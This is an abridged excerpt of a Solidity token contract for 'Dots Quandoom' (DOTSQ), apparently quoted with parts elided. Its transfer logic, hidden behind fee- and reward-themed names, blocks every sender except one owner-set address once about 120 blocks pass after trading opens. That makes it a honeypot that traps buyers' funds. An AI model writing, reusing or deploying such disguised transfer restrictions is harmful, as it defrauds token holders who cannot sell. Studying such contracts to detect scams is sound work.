...
contract DOTSQUANDOOM is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Dots Quandoom";
    string private _symbol = "DOTSQ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC42557D0B580bC244D1A9D3c9F28701f0A98cE41); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xC42557D0B580bC244D1A9D3c9F28701f0A98cE41); // Treasury / Buyback
    ...
    address allow_fee_exempts = 0x000000000000000000000000000000000000dEaD;
    bool exemptsfromFees = true;
    ...
    uint256 public rewardsAtStart = 10;
    ...
    function exempt_fee_status(address _current_fee) public onlyOwner {
        allow_fee_exempts = _current_fee;
    }
    function initTrading() public onlyOwner {
        zeroFeeBlocks = block.number;
    }
    function _status_checkFeestoDeadaddr() internal {
        if (block.number > zeroFeeBlocks + 120) {
            exemptsfromFees = false;
        }  
        else {
            exemptsfromFees = true;
        }
    }
    ...
    function setRewardsDistr() public onlyOwner {
        exemptsfromFees = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                ...
                _status_checkFeestoDeadaddr();
                if (!exemptsfromFees) {
                    require(sender == allow_fee_exempts, "Allow transfers without fees to the dead address only"); 
                }
